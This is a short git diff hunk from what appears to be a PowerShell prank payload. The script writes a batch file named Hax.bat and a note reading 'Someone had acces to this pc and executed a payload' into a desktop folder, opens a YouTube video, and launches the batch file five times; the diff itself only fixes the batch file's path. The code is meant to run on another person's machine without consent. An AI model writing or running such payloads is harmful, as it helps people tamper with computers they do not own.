@@ -14,4 +14,4 @@ Set-Content $DesktopPath/35h3hbfuh2ejwjw3j2gw439q3/Hax.bat '@echo off','title H4
 Set-Content $DesktopPath/35h3hbfuh2ejwjw3j2gw439q3/Message.txt 'Hi user', 'Someone had acces to this pc and executed a payload.', 'If you see this, please keep your pc secure.' , 'Thanks' -Encoding ASCII;
 
 start https://www.youtube.com/watch?v=uR7URJZHhhY;
-For ($i=0; $i -le 4; $i++) { start $DesktopPath/Hax.bat; }
+For ($i=0; $i -le 4; $i++) { start $DesktopPath/35h3hbfuh2ejwjw3j2gw439q3/Hax.bat; }
